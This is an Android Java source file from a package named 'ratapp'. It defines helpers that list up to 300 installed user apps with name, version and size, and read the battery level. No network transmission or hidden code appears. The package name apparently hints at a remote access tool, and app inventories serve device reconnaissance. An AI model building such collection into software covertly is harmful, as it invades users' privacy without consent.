package com.ratio.ratapp;

import android.Manifest;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.BatteryManager;
import android.util.Log;

import java.io.File;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class PhoneExtra {

    // app list
    public static List<Map<String, Object>> apps(Context ctx) {
        List<Map<String, Object>> out = new ArrayList<>();
        try {
            PackageManager pm = ctx.getPackageManager();
            List<PackageInfo> all = pm.getInstalledPackages(0);
            int max = 300;
            for (PackageInfo p : all) {
                if (out.size() >= max) break;
                if ((p.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) continue;
                Map<String, Object> e = new HashMap<>();
                e.put("pkg",  p.packageName);
                e.put("name", p.applicationInfo != null
                    ? String.valueOf(p.applicationInfo.loadLabel(pm)) : "?");
                e.put("ver",  p.versionName);
                e.put("size", new File(p.applicationInfo.sourceDir).length());
                out.add(e);
            }
        } catch (Exception e) {
            Log.e("PHONE", "apps", e);
        }
        return out;
    }

    // battery state
    public static Map<String, Object> battery(Context ctx) {
        Map<String, Object> out = new HashMap<>();
        try {
            BatteryManager bm = (BatteryManager)
                ctx.getSystemService(Context.BATTERY_SERVICE);
            out.put("charge", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY));
        } catch (Exception e) {
            out.put("error", e.getMessage());
        }
        return out;
    }
}
